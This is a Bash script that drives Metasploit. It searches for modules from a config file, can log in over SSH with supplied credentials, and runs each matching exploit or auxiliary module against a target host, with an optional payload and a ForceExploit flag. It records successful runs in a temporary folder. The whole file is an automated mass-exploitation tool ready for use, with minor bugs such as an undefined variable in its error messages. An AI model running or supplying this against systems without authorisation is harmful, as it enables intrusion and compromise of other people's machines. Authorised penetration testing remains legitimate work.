#!/bin/bash
[[ "$1" ]] || { echo -e "Usage: $0 <config>"; exit 1; }

RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[0;33m"
GRAY="\033[0;37m"
RESET="\033[0m"

TIMEOUT=300
TMP="$(mktemp -d --suffix="ftmsf")"

config="$1"
use_name="name:"

while read line;do
    [[ "$line" ]] || continue

    if [[ "${line:0:1}" == ":" ]];then
        section="${line:1}"
        continue
    fi
    case "$section" in
    "opt")
        case "$(cut -d" " -f1 <<< "$line")" in
        "use_name")
            use_name="$(cut -d" " -f2- <<< "$line")"
            [[ "$use_name" == "." ]] && unset use_name
            ;;
        "force") force=1 ;;
        "payload") msf_payload="$(cut -d" " -f2- <<< "$line")" ;;
        *)
            echo -e "[$RED KO $RESET] Invalid key: $key"
            exit 1
            ;;
        esac
        ;;
    "search")
        case "$(cut -d" " -f1 <<< "$line")" in
        "type")
            line="$(cut -d" " -f2- <<< "$line")"
            types+=("$line")
            search+=("type:$line")
            ;;
        "name") search+=("$use_name$(cut -d" " -f2- <<< "$line")") ;;
        "exclude") exclude+=($(cut -d" " -f2- <<< "$line")) ;;
        *)
            echo -e "[$RED KO $RESET] Invalid key: $key"
            exit 1
            ;;
        esac
        ;;
    "session")
        case "$(cut -d" " -f1 <<< "$line")" in
        "RHOSTS") sess_host="$(cut -d" " -f2- <<< "$line")" ;;
        "RPORT") sess_port="$(cut -d" " -f2- <<< "$line")" ;;
        "USER") sess_user="$(cut -d" " -f2- <<< "$line")" ;;
        "PASS") sess_pass="$(cut -d" " -f2- <<< "$line")" ;;
        *)
            echo -e "[$RED KO $RESET] Invalid key: $key"
            exit 1
            ;;
        esac
        ;;
    "args") args+=("$line") ;;
    esac
done<"$config"

if [[ "$sess_host" && "$sess_port"\
    && "$sess_user" && "$sess_pass" ]];then
    sess_payload="use auxiliary/scanner/ssh/ssh_login;"
    sess_payload+=" set RHOSTS $sess_host;"
    sess_payload+=" set RPORT $sess_port;"
    sess_payload+=" set USERNAME $sess_user;"
    sess_payload+=" set PASSWORD $sess_pass;"
    sess_payload+=" run;"
fi

payload="search ${search[@]}; exit"
while read line;do
    [[ "$line" ]] || continue

    for exc in "${exclude[@]}";do
        grep -q "$exc" <<< "$line" && continue 2
    done
    line="$(cut -d" " -f2- <<< "$line"\
        | sed 's=^[[:space:]]==')"

    for type in "${types[@]}";do
        if grep -q "^$type" <<< "$line";then
            keepit=1
            break
        fi
    done
    [[ "$keepit" ]] || continue
    unset keepit

    torun+=("$(cut -d" " -f1 <<< "$line")")
done< <(msfconsole -qx "$payload")

echo -e "[$GREEN OK $RESET] Found ${#torun[@]} modules"
echo -e "$GRAY========ARGS$RESET"
for arg in "${args[@]}";do echo "$arg";done
echo -e "$GRAY========>$RESET"
echo -e "$GRAY========EXCLUDES$RESET"
for exc in "${exclude[@]}";do echo "$exc";done
echo -e "$GRAY========>$RESET"

count=0
for module in "${torun[@]}";do
    payload="$sess_payload; search $module; exit -y"
    output="$(timeout "$TIMEOUT" msfconsole -qx "$payload")"
    count="$(grep -P '^\s+\d+\s+' <<< "$output" | wc -l)"

    for index in $(seq 0 "$((count - 1))");do
        echo -e "Running $module[#$index]..."

        payload="$sess_payload; search $module; use $index;"
        [[ "$msf_payload" ]] && payload+=" set payload $msf_payload;"
        [[ "$force" ]] && payload+=" set ForceExploit true;"

        for arg in "${args[@]}";do payload+=" set $arg;";done
        payload+=" run; exit -y"

        output="$(timeout "$TIMEOUT" msfconsole -qx "$payload")"
        filter="^\[+\] $sess_host:$sess_port - Success: '$sess_user:"
        output="$(grep -v "$filter" <<< "$output")"

        echo -e "$output"
        if grep -q "\[+\]" <<< "$output"; then
            echo -e "$output" > "$TMP/$(basename $module).success"
            ((count++))
        fi
    done
done
if [[ "$count" -eq 0 ]]; then
    echo -e "[$RED KO $RESET] No module succeeded"
    exit 1
fi
echo -e "[$GREEN OK $RESET] $count modules succeeded (see $TMP)"
